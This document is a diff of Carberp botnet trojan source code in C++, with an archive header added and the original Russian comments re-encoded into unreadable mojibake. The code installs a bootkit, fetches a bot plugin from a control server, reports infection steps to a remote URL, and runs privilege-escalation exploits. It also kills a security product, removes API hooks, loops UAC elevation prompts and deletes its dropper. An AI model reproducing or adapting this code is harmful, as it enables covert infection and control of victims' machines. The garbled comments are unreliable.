@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include <windows.h>
 #include <tlhelp32.h> 
 
@@ -81,12 +92,12 @@ char SVC_FUCKUP_ENABLED[] = "0";
 #endif
 
 CHAR PathBkFile[MAX_PATH]; 
-CHAR FileToDelete[MAX_PATH]; //путь для удаления первоначального файла бота
+CHAR FileToDelete[MAX_PATH]; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 
 
-// Влияет на то, будет ли вызван ExitProcess для
-// процесса, в котором вызвана ExplorerRoutine.
-DWORD dwExplorerSelf = 0; //если инжект был в собственный эксплорер
+// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ ExitProcess пїЅпїЅпїЅ
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ ExplorerRoutine.
+DWORD dwExplorerSelf = 0; //пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 VOID GetPaths();
 
@@ -107,7 +118,7 @@ BOOL SaveManifest(PCHAR FileName)
 	return ret;
 };
 
-DWORD WINAPI DeleteDropper(LPVOID) // убиваем процесс, стираем файл
+DWORD WINAPI DeleteDropper(LPVOID) // пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 {
 	BOT::Initialize();
 	DebugReportInit();
@@ -152,9 +163,9 @@ DWORD TakePrivileges()
 	OSVERSIONINFOEXA OSVer = {sizeof(OSVer), 0};
 
 
-	return 1;	//выключили сплоеты
+	return 1;	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
-	//ret = FuckupSvc();	//выключили сплоеты
+	//ret = FuckupSvc();	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	//if (ret)
 	//	OutputDebugStr("FuckupSvc ok.");
 	//else
@@ -208,7 +219,7 @@ DWORD WINAPI RebootNotifyThread(void* p)
 	{
 		PP_DPRINTF("RebootNotifyThread: pinging server...");
 
-		//150_d таймер отсчета завершения ребута
+		//150_d пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("150_d"));
 
 		PP_DPRINTF("RebootNotifyThread: sleeping 5 min");
@@ -260,13 +271,13 @@ void AddRebootPingDllToAutorun()
 
 	PP_RETURNIF1(install == NULL);
 
-	// 123_d начало вызова Install для установки ping dll
+	// 123_d пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ Install пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ ping dll
 	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("123_d"));
 
 	BOOL install_result = install(dll_body, dll_body_size);
 	if (install_result)
 	{
-		// 124_d вызов Install для установки ping dll вернул TRUE
+		// 124_d пїЅпїЅпїЅпїЅпїЅ Install пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ ping dll пїЅпїЅпїЅпїЅпїЅпїЅ TRUE
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("124_d"));
 	}
 
@@ -286,7 +297,7 @@ void GetDriverUrl(char * UrlBuffer, DWORD UrlBufferSize)
 	PStrings Fields = Strings::Create();
 	AddURLParam(Fields, "cmd", "step");
 	AddURLParam(Fields, "uid", BotUid);
-	AddURLParam(Fields, "step", "170_dr"); //170_dr таймер драйвера
+	AddURLParam(Fields, "step", "170_dr"); //170_dr пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	PCHAR Params = Strings::GetText(Fields, "&");
 	PCHAR URL = STR::New(3, PP_REPORT_URL, "?", Params);
@@ -315,7 +326,7 @@ bool SaveUrlForBootkitDriver()
 	DWORD key_created = (DWORD)pRegCreateKeyExW(HKEY_LOCAL_MACHINE, key_path, 0, NULL, 0, KEY_WRITE, NULL, &key, &opt);
 	PP_RETURNIF2(key_created != ERROR_SUCCESS, false);
 
-	// Сохраняем на всякий пожарный с 0 в конце
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ 0 пїЅ пїЅпїЅпїЅпїЅпїЅ
 	DWORD url_value_set = (DWORD)pRegSetValueExW(key, L"ID", 0, REG_BINARY, (const BYTE*)&url[0], 
 		(DWORD)plstrlenA(url));
 	PP_RETURNIF2(url_value_set != ERROR_SUCCESS, false);
@@ -344,7 +355,7 @@ bool SetupBootkit()
 		ULONG (*BkInstall)(BOOL);
 		if ( BkInstall = (ULONG(*)(BOOL))BkImage.GetProcAddress("BkInstall")  )
 		{
-			// 111_d - запуск установки
+			// 111_d - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 			PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("111_d"));
 
 			PP_DPRINTF("ExplorerStart: setup function found 0x%X. Calling it.", BkInstall);
@@ -353,7 +364,7 @@ bool SetupBootkit()
 
 			if (ret == ERROR_SUCCESS)
 			{
-				//112_d установка успешна
+				//112_d пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 				PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("112_d"));
 			}
 
@@ -376,7 +387,7 @@ DWORD WINAPI SetupBootkitInSvchost(LPVOID)
 	return 0;
 }
 
-//скачиваем bot.plug с админки
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ bot.plug пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 static BYTE* GetBotPlug( DWORD& size )
 {
 //	return File::ReadToBufferA("bot.plug", size);
@@ -385,33 +396,33 @@ static BYTE* GetBotPlug( DWORD& size )
 	return botPlug;
 }
 
-//сохраняет бот в папке Documents and Settings\username\Application Data
+//пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ Documents and Settings\username\Application Data
 static bool SavedBot( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 {
 	PP_DPRINTF( "SavedBot: start" );
-	//сначала пытаемся перенести бота из автозагрузки
+	//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	string path = BOT::GetBotFullExeName();
 	bool res = false;
 	DWORD sizeBot = 0;
 	BYTE* dataBot = 0;
 	bool delDataBot = false;
-	if( File::IsExists(path.t_str()) ) //в автозагрузке есть бот, загружаем
+	if( File::IsExists(path.t_str()) ) //пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	{
-		PP_DPRINTF( "SavedBot: переносим бот из автозагрузки" );
+		PP_DPRINTF( "SavedBot: пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ" );
 		dataBot = 0;//File::ReadToBufferA( path.t_str(), sizeBot );
 		delDataBot = true;
-		//удаляем
+		//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		/*
-		pSetFileAttributesA( path.t_str(), FILE_ATTRIBUTE_NORMAL ); //убираем атрибут для чтения
-		if( pDeleteFileA(path.t_str()) == 0 ) //если не удалился, то делаем чтобы после ребута удалился
+		pSetFileAttributesA( path.t_str(), FILE_ATTRIBUTE_NORMAL ); //пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
+		if( pDeleteFileA(path.t_str()) == 0 ) //пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		{
 			pMoveFileExA( path.t_str(), NULL, MOVEFILE_DELAY_UNTIL_REBOOT );
 		}
 		*/
 	}
-	if( !dataBot ) //из автозагрузки не удалось перенести, качаем с админки бот плаг
+	if( !dataBot ) //пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	{
-		PP_DPRINTF( "SavedBot: ставим bot.plug" );
+		PP_DPRINTF( "SavedBot: пїЅпїЅпїЅпїЅпїЅпїЅ bot.plug" );
 #ifdef BKI_PLUG
 		dataBot = bodyBotPlug;
 		sizeBot = sizeBotPlug;
@@ -433,8 +444,8 @@ static bool SavedBot( BYTE* bodyBotPlug, DWORD sizeBotPlug )
 	return res;
 }
 
-// Ф-ция, которая после проверок вызывает события старта в процессе Explorer,
-// что в свою очередь вызывает установку BkDll
+// пїЅ-пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ Explorer,
+// пїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ BkDll
 BOOL ExplorerMain( BYTE* bodyBotPlug = 0, DWORD sizeBotPlug = 0 )
 {
 	BOOL ret = FALSE;
@@ -453,7 +464,7 @@ BOOL ExplorerMain( BYTE* bodyBotPlug = 0, DWORD sizeBotPlug = 0 )
 		PP_DPRINTF("ExplorerStart: doing sending system information.");
 		PP_DBGRPT_FUNCTION_CALL(DebugReportCreateConfigReportAndSend());
 	
-		// 110_d - запуск ExplorerStart
+		// 110_d - пїЅпїЅпїЅпїЅпїЅпїЅ ExplorerStart
 		PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("110_d"));
 //		if ( SetupBootkit() )
 		if( MegaJump(SetupBootkitInSvchost) )
@@ -469,7 +480,7 @@ BOOL ExplorerMain( BYTE* bodyBotPlug = 0, DWORD sizeBotPlug = 0 )
 			PP_DPRINTF("ExplorerMain: ExplorerStart()  finished successfuly. Saving 0x00000001 in '%s'",
 				PathBkFile);
 
-			// Записываем в BkFile 4 байта с единичкой.
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ BkFile 4 пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 			File::WriteBufferA(PathBkFile,&ret,sizeof(BOOL));
 		}
 	}
@@ -481,10 +492,10 @@ BOOL ExplorerMain( BYTE* bodyBotPlug = 0, DWORD sizeBotPlug = 0 )
 
 	if ( ret )
 	{
-		// Если проверка находит файл Bk или возвращает успех при установке - 
-		// создается файл в системном корне с 4 байтами адреса строки.
-		// Этот файл проверяется ring3 ботом, который запустил дропер буткита.
-		// При нахождении этого файла он будет пытатся удалить себя из автозапуска.
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ Bk пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ - 
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ 4 пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
+		// пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ ring3 пїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+		// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 
 		PCHAR Path= STR::Alloc(MAX_PATH);
 		PCHAR UID=STR::Alloc(120);
@@ -506,7 +517,7 @@ BOOL ExplorerMain( BYTE* bodyBotPlug = 0, DWORD sizeBotPlug = 0 )
 
 	if (BkInstalledSuccess)
 	{
-		//ставим на удаление из автозагрузки уже установленного бота (возможно на машине работает бот, его нужно удалить)
+		//пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ (пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ)
 		//char* fileBot = BOT::GetBotFullExeName();
 		//pMoveFileExA( fileBot, 0, MOVEFILE_DELAY_UNTIL_REBOOT );
 		//STR::Free(fileBot);
@@ -524,14 +535,14 @@ BOOL ExplorerMain( BYTE* bodyBotPlug = 0, DWORD sizeBotPlug = 0 )
 
 #ifndef BKI_PLUG
 
-// Ф-ция, которая вызывается при инжекте в другие процессы.
-// Проверяет свои права и пробует их расширить для 
+// пїЅ-пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ 
 DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 {
 	BOT::Initialize();
 	DebugReportInit();
 	// 
-	//	Cоздадим отдельный поток для удаления так как дропер может удаляться больше минуты.
+	//	CпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 	//
 	
 	BOOL bRun = TRUE;
@@ -557,7 +568,7 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 		};
 
 		PP_DPRINTF("ExplorerRoutine: TakePrivile result=%d", bRun);
-		IsUsedExploit = TRUE; // По идее это всегда TRUE
+		IsUsedExploit = TRUE; // пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ TRUE
 	};
 
 	if ( bRun )
@@ -567,7 +578,7 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 		PP_DPRINTF("ExplorerRoutine: ExplorerMain() result=%d", bRet);
 	}
 
-	/*		Если есть права Админа но мы не юзали сплоеты и инстал не удался, юзаем сплоеты и снова делаем инстал		*/
+	/*		пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ		*/
 	if ( (bRet == FALSE) && (bRun == TRUE) && (IsUsedExploit == FALSE) )
 	{
 		PP_DPRINTF("ExplorerRoutine: Trying again to take privileges");
@@ -590,7 +601,7 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 
 	pGetVersionExA(&OSVer);
 	
-	/*		Выкидываем длл на диск и юзаем  сплойт спуллера, только XP		*/
+	/*		пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ  пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅ XP		*/
 /*
 	if ( (! bRet) && (PEFile::IsDll((PVOID)GetImageBase()) == FALSE) && (OSVer.dwMajorVersion == 5))
 	{
@@ -608,7 +619,7 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 	};
 */
 
-	/*		Запуск много раз копии дропера с прошением повышенных прав.		*/
+	/*		пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ.		*/
 	if (  bRet == FALSE )
 	{
 		PP_DPRINTF("ExplorerRoutine: start UAC asking cycle");
@@ -679,13 +690,13 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 			if ( file )
 				STR::Free(file);
 		}
-		while ( ( (DWORD)pGetFileAttributesA(PathBkFile) == INVALID_FILE_ATTRIBUTES) );	//	end do, цикл пока не появится Файл буткита
+		while ( ( (DWORD)pGetFileAttributesA(PathBkFile) == INVALID_FILE_ATTRIBUTES) );	//	end do, пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 		if ( NamePrefix )
 			STR::Free(NamePrefix);
 	};
 
-	/*		Если инстал был не удачный снова пробуем вдруг повезет*/
+	/*		пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ*/
 	if ( bRet  == FALSE)
 	{
 		PP_DPRINTF("ExplorerRoutine: Third call of ExplorerMain");
@@ -693,7 +704,7 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 		PP_DPRINTF("ExplorerRoutine: Third ExplorerMain() result=%d", bRet);
 	}
 
-	/*	 Удаляем дропер	*/
+	/*	 пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ	*/
 	PP_DPRINTF("ExplorerRoutine: Start to delete droper");
 	pCloseHandle(StartThread(DeleteDropper,NULL));
 	
@@ -707,7 +718,7 @@ DWORD WINAPI ExplorerRoutine( LPVOID lpData )
 }
 
 //
-// получаем путь к дроперу для его удаления.
+// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 //
 VOID GetPaths()
 {
@@ -761,12 +772,12 @@ bool CurrentPlatformAllowedByTargetSpecifier()
 	TargetPlatform		target = GetTargetPlatform();
 	OSVERSIONINFOEXA	ver;
 
-	// Спецификация указывает на все платформы.
-	// Значит сразу возвращаем ОК.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ.
 	if (target == TargetPlatform_All) return true;
 
-	// Определения платформы.
-	// Ошибка при получении информации считается поводом отклонить запуск.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ.
 	m_memset(&ver, 0, sizeof(ver));
 	ver.dwOSVersionInfoSize = sizeof(ver);
 	if (!pGetVersionExA(&ver) ) return false;
@@ -824,7 +835,7 @@ bool SvcFuckupEnabled()
 	return false;
 }
 
-// Callback ф-ция, которая вызывается когда стартует FuckupService
+// Callback пїЅ-пїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ FuckupService
 void SvcFuckupServiceMain()
 {
 	PP_DPRINTF("SvcFuckupServiceMain: started.");
@@ -882,7 +893,7 @@ int APIENTRY MyMain(int argc, char** argv)
 	//return 0;
 
 	BOT::Initialize();
-	UnhookDlls();//снимаем хуки
+	UnhookDlls();//пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	GetPaths();
 
 	DebugReportInit();
@@ -893,10 +904,10 @@ int APIENTRY MyMain(int argc, char** argv)
 	STR::Free(prefix);
 	DebugReportSaveSettings(statParam);
 
-	// 100_d запуск дропера
+	// 100_d пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("100_d"));
 
-	/*	проверка установлен ли буткит	*/
+	/*	пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ	*/
 	if ((DWORD)pGetFileAttributesA(PathBkFile) != INVALID_FILE_ATTRIBUTES)
 	{
 		PP_DPRINTF("MyMain: bootkit already installed. Killing oneself.");
@@ -908,10 +919,10 @@ int APIENTRY MyMain(int argc, char** argv)
 	KillOutpost();
 	DoExploits();
 
-	// 100_d запуск дропера
+	// 100_d пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("101_d"));
 
-	// Проверка целевой платформы.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	if (!CurrentPlatformAllowedByTargetSpecifier())
 	{
 		InitSuicide();
@@ -920,10 +931,10 @@ int APIENTRY MyMain(int argc, char** argv)
 		return 0;
 	}
 
-	// 109_d точка прохождения целевой платформы
+	// 109_d пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	PP_DBGRPT_FUNCTION_CALL(DebugReportStepByName("109_d"));
 
-	// Проверка на параметр запуска с правами UAC
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ UAC
 	if ( m_strstr((PCHAR)pGetCommandLineA(),ARGV_UAC_RUN) )
 	{
 		PP_DPRINTF("MyMain: UAC param detected. Calling ExplorerMain...");
@@ -941,7 +952,7 @@ int APIENTRY MyMain(int argc, char** argv)
 	};
 	
 	//
-	//  Если процесс запущен с системными правами переходим к инсталяции.
+	//  пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	//
 	if (IsUserLocalSystem())
 	{
@@ -953,8 +964,8 @@ int APIENTRY MyMain(int argc, char** argv)
 		return 0;
 	};
 
-	// Если процесс запущен обычно, но включена поддержка SvcFuckup
-	// то пробуем это сделать и прибиваем себя.
